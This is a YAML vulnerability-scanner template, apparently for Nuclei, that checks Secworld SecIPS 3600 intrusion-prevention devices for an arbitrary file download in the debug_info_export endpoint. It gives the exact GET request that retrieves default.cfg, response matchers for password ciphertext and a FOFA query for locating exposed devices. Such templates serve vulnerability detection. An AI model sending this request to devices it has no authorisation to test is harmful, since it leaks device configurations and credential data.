id: secworld-secips-3600-debuginfo-fileread

info:
  name: 网神 SecIPS 3600 debug_info_export 任意文件下载
  author: zan8in
  severity: high
  description: |
    网神 SecIPS 3600 debug_info_export 接口存在任意文件下载，可获取设备配置与口令密文。
  metadata:
    max-request: 1
    fofa-query: app="网神-SecIPS"
  tags: secips,secworld,fileread

http:
  - method: GET
    path:
      - '{{BaseURL}}/webui/debug/debug_info_export?filename=default.cfg'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'user audit type'
          - 'password cipher'
        condition: and

      - type: status
        status:
          - 200
